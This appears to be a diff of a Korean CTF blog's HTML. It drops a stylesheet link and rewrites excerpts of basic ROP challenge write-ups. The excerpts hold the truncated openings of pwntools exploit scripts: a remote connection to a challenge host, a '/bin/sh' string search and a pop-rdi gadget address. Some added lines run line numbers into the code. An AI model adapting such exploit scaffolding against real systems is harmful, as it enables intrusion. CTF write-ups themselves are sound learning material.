@@ -59,7 +59,7 @@
     
 
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 </html>
 <body>
     <div id="wrap">
@@ -262,12 +262,7 @@ a에 300,
 기본 ROP 문제
 바이너리
 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨) 
-from pwn import *
-
-#r = process('./baby2')
-r = remote('baby-01.pwn.beer', 10002)
-e = ELF('./baby2')
-libc = ELF('./libc
+12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process('./baby2')r = rem
         </p>
     </div>
 </article>
@@ -295,14 +290,7 @@ libc = ELF('./libc
 
         <p class="article-excerpt">
              Baby2
-from pwn import *
-#r = process('./baby1')
-r = remote('baby-01.pwn.beer', 10001)
-e = ELF('./baby1')
-binsh = e.search("/bin/sh").next()
-pr = 0x0000000000400793 # pop rdi; ret 
-
-ru = lambda a: r.r
+12345678910111213141516171819from pwn import *#r = process('./baby1')r = remote('baby-01.pwn.beer', 10001)e = ELF('./baby1')binsh = e.search("/bin/sh").next()pr = 0x0000000000400793 # pop rdi; 
         </p>
     </div>
 </article>
